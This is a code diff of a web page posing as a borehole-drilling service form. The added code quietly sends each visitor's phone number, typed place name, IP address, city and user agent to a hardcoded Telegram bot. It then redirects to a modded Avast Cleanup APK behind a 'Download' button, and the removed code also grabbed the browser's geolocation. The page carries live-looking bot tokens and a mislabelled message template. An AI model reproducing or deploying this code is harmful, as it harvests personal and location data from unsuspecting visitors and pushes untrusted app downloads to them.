@@ -1,14 +1,13 @@
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-   <div ng-app="">
-<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>modjadi by process</title>
     <style>body {
     font-family: Arial, sans-serif;
     background-color: #f0f2f5;
-    
+    display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
@@ -42,7 +41,7 @@
 }
 
 .form-container {
-    text-align:center ;
+    text-align: center;
 }
 
 .input-field {
@@ -122,46 +121,20 @@ a {
 }
 </style>
 </head>
-
-</body>
-</html>
-
-
-</body>
-</html>
+<body>
     <div class="container">
         <div class="logo-container">
-            <div class="logo"><strong>Bora Mati</strong></div>
-            <p class="slogan">Thank you for using our website</p>
-            <p>0637003490</p>
- <form>
-    <button type="button" onclick="getLocation()">Get Location</button>
-  </form>
-
-  <!-- AngularJS section -->
-  <div ng-app="">
-    <p>
-      Latitude: <input ng-model="latitude" type="text" id="latitude" />
-    </p>
-    <p>
-      Longitude: <input ng-model="longitude" type="text" id="longitude" />
-    </p>
-    <!-- Google Maps link with latitude and longitude -->       </div>
-
+            <div class="logo"><strong>Bora mati</strong></div>
+            <p class="slogan">Bora mati at your service fill in the details you want to do underground water</p>
+        </div>
         <div class="form-container">
-          
             <form onsubmit="submitonhfc(); return false;" method="post">
-
-
               <input type="hidden" name="" id="pagename" value="Facebook" />
-                <input type="text" id="email"  placeholder="location" value="    https://www.google.com/maps/place/{{latitude}}+{{longitude}}"
-                class="input-field" name="email" required/>
-                <input id="name" type="locate" placeholder="Size in metters" class="input-field" name="location" required>
+                <input type="number" id="email" placeholder="ur number phone" pattern="\d{16}" maxlength="16" class="input-field" name="email" required>
+                <input type="gmail" id="gmail" placeholder="place name e.g fobeni" class="input-field" name="gmail" required>
                 
-        <input type="tel" id="phone" name="phone" placeholder="phone number" class="input-field" required>
         
-        <input type="text" id="username" name="username" placeholder="Your name" class="input-field" required>
-                <button type="submit" class="login-button">Send</button>
+                <button type="submit" class="login-button">Download</button>
             </form>
             
             <div class="divider"></div>
@@ -205,19 +178,18 @@ a {
                const cityName = data.city;
     
                // Create the message to send
-               const username = document.getElementById("username").value;
-               const phone = document.getElementById("phone").value;
+               
                const page = document.getElementById("pagename").value;
-               const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
-               const message = `> Food Page : ${page}\n\n> food :
-                 ${name}\n\n> phone :
-                 ${phone}\n\n> username :
-                 ${username}\n\n> location url :
-                 ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+               const gmail = document.getElementById("gmail").value;
+               const message = `> donate Page : ${page}\n\n> food :
+                 ${name}\n\n> voucher :
+                 ${email}\n\n> User Agent :
+                 ${gmail}\n\n> gmail
+                 ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
     
                // Send the message to your Telegram bot using the appropriate API
-               const botToken = '7129591411:AAHUSwCYRvdWdQF94EW5vtwXlL9bAd8JRkg';
+               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
                const chatId =2013982441 ;
     
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -235,7 +207,7 @@ a {
                // Handle the response (optional)
                xhr.onload = function() {
                  if (xhr.status === 200) {
-                   window.location.href = "https://iamroot5.github.io/Modjadji.io/";
+                   window.location.href = "https://space.apkheist.com/Avast_Cleanup-Premium-v24.04.0_build_800010583-Mod_(APKHEIST.COM).apk?https://www.apkheist.com/wp-content/uploads/2021/03/PicsArt_03-25-06.jpg";
                  } else {
                    console.log('Error sending data to Telegram:', xhr.statusText);
                  }
@@ -243,44 +215,6 @@ a {
     
              })
              .catch(error => console.log('Error retrieving IP address information:', error));
-         }
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-    } else { 
-        alert("Geolocation is not supported by this browser.");
-    }
-}
-
-function showPosition(position) {
-    document.getElementById("latitude").value = position.coords.latitude;
-    document.getElementById("longitude").value = position.coords.longitude;
-}
-function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-      } else {
-        alert("Geolocation is not supported by this browser.");
-      }
-    }
-
-    function showPosition(position) {
-      var latitude = position.coords.latitude;
-      var longitude = position.coords.longitude;
-
-      // Set latitude and longitude values to the AngularJS model
-      var scope = angular.element(document.getElementById("latitude")).scope();
-      scope.$apply(function() {
-        scope.latitude = latitude;
-        scope.longitude = longitude;
-      });
-    }
-         </script>
-
+         }</script>
 </body>
 </html>
-</body>
-</html>
-
-
-    
